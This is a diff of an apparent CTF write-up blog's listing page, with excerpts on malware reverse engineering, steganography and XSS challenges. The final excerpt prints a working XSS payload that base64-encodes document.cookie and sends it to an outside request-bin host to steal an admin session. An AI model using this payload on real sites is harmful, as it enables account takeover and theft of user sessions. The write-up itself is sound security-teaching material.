@@ -77,6 +77,7 @@ function Login() { var i = { _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmno
 #<a href=https://nicolasb.fr/tags/reverse/>reverse</a>&nbsp;</span><div class=post-content>For this challenge, we were given a Stagged.exe executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.
 Here is the link to the full report.
 We can see in the &ldquo;Network Analysis&rdquo; tab that the program made two requests:
+HTTP Traffic&rdquo; part of the report"
 Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to /ordertoexecute.</div><div><a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-reverse-verify-this/>Read more →</a></div></div><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>Writeup Cyber Threat Force : Welcome to the matrix</a></h1><div class=post-meta><span class=post-date>2021-07-09</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
@@ -136,8 +137,7 @@ The only thing that changed for the second version is the encrypted data, which 
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:
-Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.
-Clicking the login button prompts us for a username and password; the test/test combination works.</div><div><a class="read-more button" href=/blog/writeup-dghack-job-board/>Read more →</a></div></div><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/>Writeup DG&rsquo;hAck: Time for Something Different</a></h1><div class=post-meta><span class=post-date>2020-11-30</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.</div><div><a class="read-more button" href=/blog/writeup-dghack-job-board/>Read more →</a></div></div><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/>Writeup DG&rsquo;hAck: Time for Something Different</a></h1><div class=post-meta><span class=post-date>2020-11-30</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content>This is a steganography challenge where we&rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.
@@ -203,6 +203,5 @@ Hmm. The challenge is quite similar to the last one, so we know that the flag is
 #<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
 Trying a classic xss (&lt;script>alert(1)&lt;/script>) in the message field seems to work. We know that we have to login as an admin user, so let&rsquo;s try stealing the cookies :
 &lt;svg onload="document.body.innerHTML=document.body.innerHTML.concat('&lt;img src=\'https://eni7j9jobszxl.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))" /> After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :</div><div><a class="read-more button" href=/blog/writeup-dghack-internal-support-1/>Read more →</a></div></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=/blog/page/3/><span class=button__icon>←</span>
-<span class=button__text>Newer posts</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
-<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+<span class=button__text>Newer posts</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
